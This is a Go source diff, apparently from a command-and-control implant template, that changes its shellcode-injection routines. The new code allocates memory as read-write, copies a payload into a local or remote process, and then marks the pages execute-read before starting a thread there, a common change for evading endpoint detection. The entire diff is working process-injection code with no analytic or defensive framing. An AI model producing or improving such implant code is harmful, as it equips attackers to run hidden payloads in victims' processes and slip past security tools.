@@ -31,13 +31,31 @@ var (
 	kernel32               = syscall.MustLoadDLL("kernel32.dll")
 	procVirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
+	procVirtualProtect     = kernel32.MustFindProc("VirtualProtect")
+	procVirtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
 	procCreateThread       = kernel32.MustFindProc("CreateThread")
 
-	ntdllPath    = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
+	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
 )
+
+func virtualProtect(lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
+	r1, _, err := procVirtualProtect.Call(lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
+	if uint(r1) == 0 {
+		return err
+	}
+	return nil
+}
+
+func virtualProtectEx(handle syscall.Handle, lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
+	r1, _, err := procVirtualProtectEx.Call(uintptr(handle), lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
+	if uint(r1) == 0 {
+		return err
+	}
+	return nil
+}
 
 func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
 	r1, _, e1 := procVirtualAllocEx.Call(
@@ -87,7 +105,7 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 
 func sysAlloc(size int) (uintptr, error) {
 	n := uintptr(size)
-	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
+	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, syscall.PAGE_READWRITE)
 	if addr == 0 {
 		return 0, err
 	}
@@ -183,7 +201,7 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 	// {{if .Debug}}
 	log.Println("allocating remote process memory ...")
 	// {{end}}
-	remoteAddr, err := virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	remoteAddr, err := virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
 	// {{if .Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	// {{end}}
@@ -203,6 +221,15 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 		// {{if .Debug}}
 		log.Printf("[!] failed to write data into remote process")
 		// {{end}}
+		return err
+	}
+	var oldProtect int
+	// Set proper page permissions
+	err = virtualProtectEx(processHandle, remoteAddr, uint(dataSize), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtectEx failed:", err)
+		//{{end}}
 		return err
 	}
 
@@ -259,6 +286,14 @@ func LocalTask(data []byte) error {
 	buf := (*[9999999]byte)(unsafe.Pointer(addr))
 	for index := 0; index < size; index++ {
 		buf[index] = data[index]
+	}
+	var oldProtect int
+	err = virtualProtect(addr, uint(size), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtect failed:", err)
+		//{{end}}
+		return err
 	}
 	// {{if .Debug}}
 	log.Printf("creating local thread with start address: 0x%08x", addr)
